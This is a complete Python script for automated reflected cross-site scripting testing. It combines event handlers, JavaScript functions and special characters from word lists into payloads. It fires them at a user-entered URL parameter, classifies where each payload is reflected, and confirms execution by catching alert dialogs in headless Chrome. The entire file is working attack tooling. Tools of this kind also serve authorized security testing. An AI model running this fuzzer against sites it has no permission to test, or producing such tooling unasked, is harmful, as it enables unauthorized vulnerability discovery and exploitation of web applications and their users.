import requests
import urllib.parse
from itertools import product
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoAlertPresentException, WebDriverException
import time

def load_list_from_file(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def generate_payloads(events, funcs, chars):
    for event, func, char in product(events, funcs, chars):
        yield f'{char} {event}={func} {char}'

def analyze_context(payload, html):
    soup = BeautifulSoup(html, "html.parser")
    context_found = set()

    for tag in soup.find_all():
        for attr, val in tag.attrs.items():
            if isinstance(val, list):
                val = " ".join(val)
            if payload in val:
                context_found.add("Attribute")

    for script in soup.find_all("script"):
        if payload in script.text:
            context_found.add("ScriptBlock")

    for tag in soup.find_all(href=True):
        if payload in tag['href']:
            context_found.add("Href/URL")

    if payload in soup.get_text():
        context_found.add("TextContent")

    return list(context_found) if context_found else ["Unknown"]

def is_payload_executed_in_browser(url):
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=options)

    try:
        driver.get(url)
        time.sleep(2)
        alert = driver.switch_to.alert
        alert_text = alert.text
        alert.accept()
        driver.quit()
        return True, alert_text
    except NoAlertPresentException:
        driver.quit()
        return False, None
    except WebDriverException as e:
        driver.quit()
        return False, str(e)

def fuzz_and_analyze(target_url, payloads):
    passed = []
    blocked = []
    executed = []

    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload)
        full_url = target_url + encoded_payload
        print(f"[*] Testing: {full_url}")
        try:
            response = requests.get(full_url, timeout=5)
            context = analyze_context(payload, response.text)

            if payload in response.text:
                print(f"[+] Reflected: {payload}  | Context: {context}")
                passed.append((payload, context))

                executed_flag, alert_content = is_payload_executed_in_browser(full_url)
                if executed_flag:
                    print(f"💥 Executed in browser! [Payload]: {payload}")
                    executed.append((payload, alert_content, context))
            else:
                print(f"[-] Blocked/Filtered: {payload}")
                blocked.append((payload, context))
        except Exception as e:
            print(f"[!] Request failed: {e}")
            blocked.append((payload, ["Error"]))

    return passed, blocked, executed

def main():
    target = input("Enter target URL with parameter (e.g. https://site.com/search?q=): ").strip()
    if "?" not in target or "=" not in target:
        print("Invalid URL format.")
        return

    events = load_list_from_file("event_handlers.txt")
    functions = load_list_from_file("functions.txt")
    chars = load_list_from_file("special_chars.txt")

    print(f"[*] Generating payloads...")
    payloads = list(generate_payloads(events, functions, chars))

    print(f"[*] Fuzzing with {len(payloads)} combinations and browser confirmation...")
    passed, blocked, executed = fuzz_and_analyze(target, payloads)

    print("\n✅ Reflected Payloads with Context:")
    for p, ctx in passed:
        print(f"  -> {p}   [Context: {', '.join(ctx)}]")

    print("\n❌ Blocked Payloads with Context:")
    for p, ctx in blocked:
        print(f"  -> {p}   [Context: {', '.join(ctx)}]")

    print("\n💥 Confirmed XSS Executions with Context:")
    for p, alert, ctx in executed:
        print(f"  -> {p}  [Alert: {alert}] [Context: {', '.join(ctx)}]")

if __name__ == "__main__":
    main()
